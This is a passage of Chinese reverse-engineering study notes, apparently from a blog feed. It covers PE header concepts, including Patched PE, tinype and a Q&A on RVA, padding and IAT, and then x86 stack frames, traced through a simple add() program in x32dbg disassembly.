alt="image-20211204101345636"></p><p>PEView中，PE头按不同结构体分类组织起来，非常方便查看，也能非常容易地在RVA与文<br>件偏移间转换（与前面讲解的内容与术语略微不同。若二者都能熟练掌握，与他入沟通时会更加顺畅）。</p><p>强烈建议各位自己制作一个PE Viewer。我刚开始学习PE头时（为了验证）就制作了一款基于控制台的PE Viewer,使用至今。亲手制作PE Viewer可以学到更多知识，纠正理解上的错误，<br>更有利于进步。</p><h2 id="13-7-2-Patched-PE"><a href="#13-7-2-Patched-PE" class="headerlink" title="13.7.2 Patched PE"></a>13.7.2 Patched PE</h2><p>顾名思义，PE规范只是一个建议性质的书面标准，査看各结构体内部会发现，其实有许多成员并未被使用。事实上，只要文件符合PE规范就是PE文件，利用这一点可以制作出一些脱离常识的PE文件。</p><p>Patched PE指的就是这样的PE文件，这些PE文件仍然符合PE规范，但附带的PE头非常具有创意（准确地说，PE头纠缠放置到各处）。代码逆向分析中，Patched PE涉及的内容宽泛而有深度，详细讲解须另立主题。</p><p>这里只介绍一点，但是足以颠覆前面对PE头的常规理解（但仍未违反PE规范）</p><p>在下列网站制作一个名为“tinype”的最小PE文件。</p><p><a href="http://blogs.securiteam.com/index.php/archives/675">http://blogs.securiteam.com/index.php/archives/675</a></p><p>它是正常的PE文件，大小只有411个字节。其IMAGE_NT_HEADERS结构体大小只有248个字节，从这一点来看，的确非常小。其他入也不断加入挑战，现在已经出现了304个字节的PE文 件。有入访问上面网站后受到了刺激，制作了一个非常极端、非常荒唐的PE文件，在下列网址中可以看到。</p><p><a href="http://www.phreedom.org/solar/code/tinype/">http://www.phreedom.org/solar/code/tinype/</a></p><p>进入网站后可以下载一个97字节的PE文件，它可以在Windows XP中正常运行。并且网站记录了PE头，与tiny pe的制作过程，认真阅读这些内容会有很大帮助（需要具备一点汇编语言的知识）。希望各位全部下载并逐一分析，技术水平必有显著提高。</p><h1 id="13-8-小结"><a href="#13-8-小结" class="headerlink" title="13.8 小结"></a>13.8 小结</h1><p>这些Patched PE文件能够帮助打破对PE文件的固有概念，对我、对普通的逆向分析入员都一样。正因如此，逆向分析技术学起来才更有意思。关于PE头需要再次强调的内容整理如下。 </p><ul><li>PE规范只是一种标准规范而已（有许多内容未使用）。</li><li>现在已知关于PE头的认识中有些是错误的（除tinype外，会出现更多操作PE头的创意技巧）。</li><li>经常检验掌握的知识，发现不懂的马上补充学习。</li></ul><p>后面还会有机会详细分析、学习Patched PE文件有关知识，到时再向各位一一介绍有关操作PE头更多有趣而奇特的技巧。</p><blockquote><p>Q.前面的讲解中提到，执行文件加载到内存时会根据Imagebase确定地址，那么2个notepad程序同时运行时Imagebase都是10000000,它们会侵占彼此的空间区域，不是这样吗？ </p><p>A.生成进程（加载到内存）时，OS会单独为它分配4GB大小的虚拟内存。虚拟内存与实际物理内存是不同的。同时运行2个notepad时，各进程分别在自身独有的虚拟内存空间中，<br>所以它们彼此不会重叠。这是由OS来保障的。因此，即使它们的Imagebase—样也完全没问题。 </p><p>Q.不怎么理解“填充”（padding）这一概念。 </p><p>A.相信会有很多入想了解PE文件的“填充”这一概念，就当它是为了对齐“基本单位”而添加的“饶头”。“基本单位”这个概念在计算机和日常生活中都常见。</p><p>比如，保管大量的橘子时并不是单个保管，而是先把它们分别放入一个个箱子中，然后再放入仓库。这些箱子就是“基本单位”。并且，说橘子数量时也很少说几个橘子，而说 几箱橘子，这样称呼会更方便3橘子箱数增加很多时，就要增加保管仓库的数量。此时不会再说几箱橘子，而是说“几仓库的橘子”。事实上，这样保管橘子便于检索，查找时 只要说出“几号仓库的几号箱子的第几个橘子”即可。也就是说，保存大量数据时成“捆”<br>保管，整理与检索都会变得更容易。这种“基本单位”的概念也被融入计算机设计，还被应用到内存、硬盘等。各位一定听说过硬盘是用“扇区”这个单位划分的吧？</p><p>同样，“基本单位（大小）”的概念也应用到了PE文件格式的节区。即使编写的代码（编译为机器语言）大小仅有100d字节，若节区的基本单位为1000d（400h）字节，那么代码节区最小也应该为1000d。其中100个字节区域为代码，其余900个字节区域填充着NULL（0）,后者称为NULL填充区域。内存中也使用“基本单位”的概念（其单位的大小比普通文件要略大一些）。那么PE文件中的填充是谁创建的呢？在开发工具（VC++&#x2F;VB等）中生成PE文件时由指定的编译选项确定。 </p><p>Q.经常在数字旁边见到字母“h”，它是什么单位？ </p><p>A.数字旁边的字母“h”是Hex的首字母，表示前面的数字为十六进制数。另外，十进制数用d （ Decimal ）、八进制数用o （ Octal ）、二进制数用b （ Binary ）标识。 </p><p>Q.如何只用Hex Editor识别出DOS存根、IMAGE_FILE_HEADER等部分呢？ </p><p>A.根据PE规范，IMAGE_DOS_HEADER的大小为40个字节，DOS存根区域为40〜PE签名区域。紧接在PE签名后的是IMAGE_FILE_HEADER，且该结构体的大小是已知的，所以也可以在Hex Editor中表示出来。也就是说，解析PE规范中定义的结构体及其成员的含义，即可区分出各组成部分（多看几次就熟悉了）。</p><p>Q. IMAGE_FILE_HEADER 的 TimeDateStamp 值为0x47918EA2 ,在 PEView 中显示为2008&#x2F;01&#x2F;19,05:46:10 UTC,如何才能这样解析出来呢？</p><p> A.使用C语言标准库中提供的ctime（)函数，即可把4个字节的数字转换为实际的日期字符串。 </p><p>Q. PE映像是什么？ </p><p>A. PE映像这一术语是微软创建PE结构时开始使用的。一般是指PE文件运行时加栽到内存中的形态。PE头信息中有一个SizeOflmage项，该项指出了PE映像所占内存的大小。当然，<br>这个大小与文件的大小不一样。PE文件格式妙处之一就在于，其文件形态与内存形态是不同的。 </p><p>Q.不太明白EP这一概念。 </p><p>A. EP地址是程序中最早被执行的代码地址。CPU会最先到EP地址处，并从该处开始依次执行指令。 </p><p>Q.用PEView打开记事本程序（notepad.exe）后，发现各节区的起始地址、大小等与示例中的不同，为什么会这样呢？ </p><p>A. notepad.exe文件随OS版本的不同而不同（其他所有系统文件也如此）。换言之，不同版本的OS下，系统文件的版本也是不同的。微软可能修改了代码、更改了编译选项，重新编译后再发布。 </p><p>Q.对图13-9及其下面的Quiz不是很理解。如何知道RVA 5000包含在哪个节区呢？ </p><p>A.图13-9是以节区头信息为基础绘制的。图（或节区头信息）中的.text节区是指VA 01001000-01009000区域，转换为RVA形式后对应于RVA 1000〜9000区域（即减去Imagebase值的01000000 ）。由此可知，RVA 5000包含在.text节区中。 </p><p>Q.讲解节区头成员VirtualAddress时提到，它是内存中节区头的起始地址（RVA），<br>VirtualAddress不就是VA吗？为什么要叫RVA呢？ </p><p>A. “使用RVA值来表示节区头的成员VirtualAddress”，这样理解就可以了。节区头结构体<br>（IMAGE_SECTION_HEADER ）的 VirtualAddress成员与虚拟内存地址（VA , VirtualAddress ）用的术语相同才引起这一混乱。此处“VirtualAddress成员指的是虚拟内存中相应节区的起始地址，它以RVA的形式保存”，如此理解即可。</p><p>Q.查看某个文件时，发现其IMAGEJMPORT_DESCRIPTOR结构体的OriginaFirstThunk成员为NULL,跟踪FirstFThunk成员，看到一个实际使用的API的名称字符串数组（INT）。<br>跟踪FirstThunk应该看到的是IAT而不是INT，这是怎么回事呢？ </p><p>A. PE装载器无法根据OriginalFirstThunk查找到API名称字符串数组（INT）时，就会尝试用FirstThunk查找。本来FirstThunk含义为IAT，但在实际内存中被实际的API函数地址覆盖 掉了（此时INT与IAT虽然是相同区域，但仍然能够正常工作）。 </p><p>Q.使用Windows7的notepad.exe测试，用PEView打开后，IAT起始地址为01001000,而用OllyDbg查看时IAT出现在00831000地址处。请问这是怎么回事呢？ </p><p>A.这是由Windows Vista、7中使用的ASLR技术造成的。请参考第41章。 </p><p>Q. EAT讲解中提到的Ordinal究竟是什么？不太理解。 </p><p>A.把Ordinal想成导出函数的固有编号就可以了。有时候某些函数对外不会公开函数名，仅公开函数的固有编号（Ordinal）。导入并使用这类函数时，要先用Ordinal查找到相应函数 的地址后再调用。比如下面示例（1）通过函数名称来获取函数地址，示例（2）则使用函数的 Ordinal来取得函数地址。<br>示例（1） pFunc&#x3D;GetProcAddress（ “TestFunc”）；<br>示例（2） pFunc&#x3D;GetProcAddress（5）;</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第13章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第7章 栈帧</title>
    <link href="/1999/02/10/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7/"/>
    <url>/1999/02/10/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7/</url>
    
    <content type="html"><![CDATA[<p>本章我们将学习栈帧（Stack Frame）相关知识，栈帧在程序中用于声明局部变量、调用函数。理解了栈帧，就能轻松掌握保存在其中的函数参数和局部变量，这对我们调试代码也是很有帮助的。</p><p>目标</p><ul><li>理解栈帧的运行原理。 </li><li>编写简单的程序，通过调试观察栈侦情况。 </li><li>详细讲解几个简单的汇编指令。</li></ul><h1 id="7-1栈帧"><a href="#7-1栈帧" class="headerlink" title="7.1栈帧"></a>7.1栈帧</h1><p>简言之，栈帧就是利用EBP （栈帧指针，请注意不是ESP）寄存器访问栈内局部变量、参数、函数返回地址等的手段。通过前面关于IA-32寄存器的学习我们知道，ESP寄存器承担着栈顶指针的作用，而EBP寄存器则负责行使栈帧指针的职能。程序运行中，ESP寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以ESP值为基准编写程序会十分困难，并且也很难使CPU引用到准确的地址。所以，调用某函数时，先要把用作基准点（函数起始地址）的ESP值保存到EBP,并维持在函数内部。这样，无论ESP的值如何变化，以EBP的值为基准（base）能够安全访问到相关函数的局部变量、参数、返回地址，这就是EBP寄存器作为栈帧指针的作用。</p><p>接下来看看栈帧对应的汇编代码（<strong>重点</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH EBP;函数开始（使用EBP前先把已有值保存到栈中）<br>MOV EBP, ESP;保存当前ESP到EBP中<br><br>...;函数体<br>;无论ESP值如何变化，EBP都保持不变，可以安全访问函数的局部变量、参数<br><br>MOV ESP, EBP;将函数的起始地址返回到ESP中<br>POP EBP;函数返回前弹出保存在栈中的EBP值<br>RETN;函数终止<br></code></pre></td></tr></table></figure><p>借助栈帧技术管理函数调用时，无论函数调用的深度有多深、多复杂，调用栈都能得到很好的管理与维护。</p><blockquote><ul><li><p>最新的编译器中都带有一个“优化”（Optimization）选项，使用该选项编译简单的函数将不会生成栈帧。 </p></li><li><p>在栈中保存函数返回地址是系统安全隐患之一，攻击者使用缓冲区溢出技术能够把保存在栈内存的返回地址更改为其他地址。</p></li></ul></blockquote><h1 id="7-2-调试示例：stackframe-exe"><a href="#7-2-调试示例：stackframe-exe" class="headerlink" title="7.2 调试示例：stackframe.exe"></a>7.2 调试示例：stackframe.exe</h1><p>下面调试一个非常简单的程序来进一步了解栈帧相关知识。</p><h2 id="7-2-1-StackFrame-cpp"><a href="#7-2-1-StackFrame-cpp" class="headerlink" title="7.2.1 StackFrame.cpp"></a>7.2.1 StackFrame.cpp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// StackFrame.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">long</span> a, <span class="hljs-type">long</span> b)</span> &#123;<br>    <span class="hljs-type">long</span> x = a, y = b;<br>    <span class="hljs-keyword">return</span> (x + y);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">long</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,add(a, b));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在进行实验时使用的是Visual Studio，为了更好地适用栈帧，必须使用Release版本来编译程序，并且关闭Visual Studio的优化选项（&#x2F;Od）后再编译程序。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205162157436.png" alt="image-20211205162157436"></p><p>使用x32dbg调试工具打幵StackFrame.exe文件，找到main函数所在位置，如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205162538805.png" alt="image-20211205162538805"></p><p>对于尚不熟悉汇编语言的朋友来说，上图中的代码可能有些复杂，下面我们会详细讲解。通过与C语言源代码的对照讲解，分析代码执行各阶段中栈内数据的变化，帮助大家更好地理解。</p><h2 id="7-2-2开始执行main-函数-amp-生成栈帧"><a href="#7-2-2开始执行main-函数-amp-生成栈帧" class="headerlink" title="7.2.2开始执行main()函数&amp;生成栈帧"></a>7.2.2开始执行main()函数&amp;生成栈帧</h2><p>VS中的反汇编界面已经非常贴心地给出了汇编代码和C语言的对照表，照搬如下。其中由于VS装在Win10上，反汇编界面对应的地址是使用了ASLR的，我们将以x32dbg（win7环境下的地址为准）。</p><p>add函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">     4: long add(long a, long b) &#123;<br>006C1080 55                   push        ebp  <br>006C1081 8B EC                mov         ebp,esp  <br>006C1083 83 EC 08             sub         esp,8  <br>     5:     long x = a, y = b;<br>006C1086 8B 45 08             mov         eax,dword ptr [a]  ;param &#x27;a&#x27;<br>006C1089 89 45 FC             mov         dword ptr [x],eax  ;local &#x27;x&#x27;<br>006C108C 8B 4D 0C             mov         ecx,dword ptr [b]  ;param &#x27;b&#x27;<br>006C108F 89 4D F8             mov         dword ptr [y],ecx  ;local &#x27;y&#x27;<br>     6:     return (x + y);<br>006C1092 8B 45 FC             mov         eax,dword ptr [x]  <br>006C1095 03 45 F8             add         eax,dword ptr [y]  <br>     7: &#125;<br>006C1098 8B E5                mov         esp,ebp  <br>006C109A 5D                   pop         ebp  <br>006C109B C3                   ret<br></code></pre></td></tr></table></figure><p>main函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">     9: int main(int argc, char* argv[]) &#123;<br>006C10A0 55                   push        ebp  <br>006C10A1 8B EC                mov         ebp,esp  <br>006C10A3 83 EC 08             sub         esp,8  <br>    10:     long a = 1, b = 2;<br>006C10A6 C7 45 F8 01 00 00 00 mov         dword ptr [a],1  <br>006C10AD C7 45 FC 02 00 00 00 mov         dword ptr [b],2  <br>    11:     printf(add(a, b));<br>006C10B4 8B 45 FC             mov         eax,dword ptr [b]  <br>006C10B7 50                   push        eax  <br>006C10B8 8B 4D F8             mov         ecx,dword ptr [a]  <br>006C10BB 51                   push        ecx  <br>006C10BC E8 BF FF FF FF       call        add (06C1080h)  <br>006C10C1 83 C4 08             add         esp,8  <br>006C10C4 50                   push        eax  <br>006C10C5 E8 76 FF FF FF       call        printf (06C1040h)  <br>006C10CA 83 C4 04             add         esp,4  <br>    12:     return 0;<br>006C10CD 33 C0                xor         eax,eax  <br>    13: &#125;<br>006C10CF 8B E5                mov         esp,ebp  <br>006C10D1 5D                   pop         ebp  <br>006C10D2 C3                   ret  <br></code></pre></td></tr></table></figure><p>首先从StackFrame.cpp源程序的主函数开始分析，代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br></code></pre></td></tr></table></figure><p>函数main()是程序开始执行的地方，在main()函数的起始地址（ 42F430）处，设置一个断点，然后按运行程序，程序运行到main()函数的断点处暂停。</p><p>开始执行main()函数时栈的状态如下图所示。从现在开始要密切关注栈的变化，这是我们要重点学习的内容。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205192352364.png" alt="image-20211205192352364"></p><blockquote><p>当前ESP的值为12FF44，EBP的值为12FF88。切记地址4012A0保存在ESP（12FF44）中，它是main()函数执行完毕后要返回的地址。</p></blockquote><p>大家的运行环境不同，这意味着看到的地址可能会与上图中的不一样。</p><p>main()函数一开始运行就生成与其对应的函数栈帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401040    | 55                  | push ebp                        |<br></code></pre></td></tr></table></figure><p>PUSH是一条压栈指令，上面这条PUSH语句的含义是“把EBP值压入栈”。main()函数中，EBP为栈帧指针，用来把EBP之前的值备份到栈中（main()函数执行完毕，返回之前，该值会再次恢复）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401041    | 8BEC                | mov ebp,esp                     |<br></code></pre></td></tr></table></figure><p>MOV是一条数据传送命令，上面这条MOV语句的命令是“把ESP值传送到EBP”。换言之，从这条命令开始，EBP就持有与当前ESP相同的值，并且直到main()函数执行完毕，EBP的值始终保持不变。也就是说，我们通过EBP可以安全访问到存储在栈中的函数参数与局部变量。执行完00401040与00401041地址处的两条命令后，函数main()的栈帧就生成了（设置好EBP了）。</p><p>x32dbg的栈窗口默认是ESP寻址，下拉如下菜单选择头两个即可在ESP寻址和EBP寻址之间来回切换，右侧的数字是显示偏移的最大长度。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205192600662.png" alt="image-20211205192600662"></p><p>接下来，在x32dbg的栈窗口中确认EBP的位置。程序调试到现在的栈内情况如下图所示，把地址转换为相对于EBP的偏移后，能更直观地观察到栈内情况。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205192540929.png" alt="image-20211205192540929"></p><p>如上图所示，当前EBP值为12FF40,与ESP值一致，12FF40地址处保存着12FF88,它是main()函数开始执行时EBP持有的初始值。</p><h2 id="7-2-3-设置局部变量"><a href="#7-2-3-设置局部变量" class="headerlink" title="7.2.3 设置局部变量"></a>7.2.3 设置局部变量</h2><p>下面开始分析源文件StackFrame.cpp中的变量声明及赋值语句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>main()函数中，上述语句用于在栈中为局部变量（a，b）分配空间，并赋初始值。main()函数中声明的变量a、b是如何在函数栈中生成的，又是如何管理的呢？下面一起来揭晓其中的秘密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010A3    | 83EC 08             | sub esp,8                       |<br></code></pre></td></tr></table></figure><p>SUB是汇编语言中的一条减法指令，上面这条语句用来将ESP的值减去8个字节。如图7-4所 示，执行该条命令之前，ESP的值为12FF40,减去8个字节后，变为12FF38。那么为什么要将ESP减去8个字节呢？从ESP减去8个字节，其实质是为函数的局部变量（a与b，请参考代码7-2）开辟空间，以便将它们保存在栈中。由于局部变量a与b都是long型（长整型），它们分别占据4个字节大小，所以需要在栈中开辟8个字节的空间来保存这2个变量。</p><p>使用SUB指令从ESP中减去8个字节，为2个函数变量开辟好栈空间后，在main()内部，无论ESP的值如何变化，变量a与b的栈空间都不会受到损坏。由于EBP的值在main()函数内部是固定不变的，我们就能以它为基准来访问函数的局部变量了。继续看如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010A6    | C745 F8 01000000    | mov dword ptr ss:[ebp-8],1              |; [EBP-4] = local ，a<br>004010AD    | C745 FC 02000000    | mov dword ptr ss:[ebp-4],2              |; [EBP-8] = local ，b<br></code></pre></td></tr></table></figure><p>对于刚刚接触汇编语言的朋友来说，上面两条命令中的“DWORD PTRSS:[EBP-4]” 部分可能略显陌生。其实没什么难的，只粟把它们看作类似于C语言中的指针就可以了。</p><p>上面这些指针命令很难用简洁明了的语言描述出来，简单翻译一下就是，地址EBP-4处有一个4字节大小的内存空间。</p><blockquote><p>DWORD PTR SS:[EBP-4]语句中，SS是Stack Segment的缩写，表示栈段。由于Windows中使用的是段内存模型（Segment Memory Model），使用时需要指出相关内存属于哪一个区段。其实，32位的Windows OS中，SS、DS、ES的值皆为0，所以采用 这种方式附上区段并没有什么意义。（这里存疑）因EBP与ESP是指向栈的寄存器，所以添加上了SS寄存器。请注意，“DWORD PTR”与“SS:”等字符串可以通过设置x32dbg的相应选项来隐藏。</p></blockquote><p>再次分析上面的2条MOV命令，它们的含义是“把数据1与2分别保存到[EBP-4]与[EBP-8]中”, 即[EBP-4]代表局部变量a，[EBP-8]代表局部变量b。执行完上面两条语句后，函数栈内的情况如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205192634628.png" alt="image-20211205192634628"></p><h2 id="7-2-4-add-函数参数传递与调用"><a href="#7-2-4-add-函数参数传递与调用" class="headerlink" title="7.2.4 add()函数参数传递与调用"></a>7.2.4 add()函数参数传递与调用</h2><p>StackFrame.cpp源代码中使用如下语句调用add()函数，执行加法运算并输出函数返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,add(a, b));<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">004010B4    | 8B45 FC             | mov eax,dword ptr ss:[ebp-4]            |;[EBP-8] = b<br>004010B7    | 50                  | push eax                                |;Arg2 = 00000002<br>004010B8    | 8B4D F8             | mov ecx,dword ptr ss:[ebp-8]            |;[EBP-4] = a<br>004010BB    | 51                  | push ecx                                |;Arg1 = 00000001<br>004010BC    | E8 BFFFFFFF         | call petest01.401080                    |;add()<br></code></pre></td></tr></table></figure><p>请看上面5行汇编代码，它描述了调用add()函数的整个过程。地址40103C处为”Call 401080”命令，该命令用于调用401080处的函数，而401080处的函数即为add()函数。函数add()接收a、b这2个长整型参数，所以调用add()之前需要先把2个参数压入栈，地址004010B4-004010BB之间的代码即用于此。这一过程中需要注意的是，参数入栈的顺序与C语言源码中的参数顺序恰好相反（我们把这称为函数参数的逆向存储）。换言之，变量b （ [EBP-8]）首先入栈，接着变量a （[EBP-4]）再入栈。执行完地址004010B4-004010BB之间的代码后，栈内情况如下图所示。</p><blockquote><p>P.S. 这里和书上结果不太一样，原因是开辟局部变量的时候编译器选择先填充了低地址，原因未明。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205192819166.png" alt="image-20211205192819166"></p><p>相比之下书上的栈内空间更能体现出逆序的感觉：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205172056956.png" alt="image-20211205172056956"></p><p>接下来进入add()函数（401080）内部，分析整个函数调用过程</p><p>返回地址</p><p>执行CALL命令进入被调用的函数之前，CPU会先把函数的返回地址压入栈，用作函数执行完毕后的返回地址。在地址004010BC处调用了add()函数，它的下一条命令的地址为4010C1。函数add()执行完毕后，程序执行流应该返回到4010C1地址处，该地址即被称为add()函数的返回地址。执行完004010BC地址处的CALL命令后进入函数，栈内情况如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205192856471.png" alt="image-20211205192856471"></p><blockquote><p>从这里也不难看出，call指令的等价命令是push call指令下一条指令的地址+jmp call调用的函数地址</p></blockquote><h2 id="7-2-5开始执行add-函数-amp-生成栈帧"><a href="#7-2-5开始执行add-函数-amp-生成栈帧" class="headerlink" title="7.2.5开始执行add()函数&amp;生成栈帧"></a>7.2.5开始执行add()函数&amp;生成栈帧</h2><p>StackFrame.cpp源代码中，函数add()的前2行代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">long</span> a, <span class="hljs-type">long</span> b)</span><br>&#123;<br></code></pre></td></tr></table></figure><p>函数幵始执行时，栈中会单独生成与其对应的栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401080    | 55                  | push ebp                                |<br>00401081    | 8BEC                | mov ebp,esp                             |<br></code></pre></td></tr></table></figure><p>上面2行代码与开始执行main()函数时的代码完全相同，先把EBP值（main()函数的基址指针）保存到栈中，再把当前ESP存储到EBP中，这样函数add()的栈帧就生成了。如此一来，add()函数内部的EBP值始终不变。执行完以上2行代码后，栈内情况如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC7%E7%AB%A0%20%E6%A0%88%E5%B8%A7.assets/image-20211205193002824.png" alt="image-20211205193002824"></p><p>可以看到，main()函数使用的EBP值（12FF40 ）被备份到栈中，然后EBP的值被设置为一个新值12FF28。</p><h2 id="7-2-6设置add-函数的局部变量（x，y）"><a href="#7-2-6设置add-函数的局部变量（x，y）" class="headerlink" title="7.2.6设置add()函数的局部变量（x，y）"></a>7.2.6设置add()函数的局部变量（x，y）</h2><p>StackFrame.cpp源代码中有如下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> x = a, y = b;<br></code></pre></td></tr></table></figure><p>上面一行语句声明了2个长整型的局部变量（x,y）,并使用2个形式参数（a,b）分别为它们赋初始值。希望大家密切关注形式参数与局部变量在函数内部以何种方式表示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401083    | 83EC 08             | sub esp,8                               |<br></code></pre></td></tr></table></figure><p>上面这条语句的含义为，在栈内存中为局部变量x、y开辟8个字节的空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401086    | 8B45 08             | mov eax,dword ptr ss:[ebp+8]            |;[ebp+8] = param a<br>00401089    | 8945 FC             | mov dword ptr ss:[ebp-4],eax            |;[ebp-4] = local x<br>0040108C    | 8B4D 0C             | mov ecx,dword ptr ss:[ebp+C]            |;[ebp+C] = param b<br>0040108F    | 894D F8             | mov dword ptr ss:[ebp-8],ecx            |;[ebp-8] = local y<br></code></pre></td></tr></table></figure><p>add函数的栈帧生成之后，EBP的值发生了变化，[EBP+8]与[EBP+C]分别指向参数a与b，如 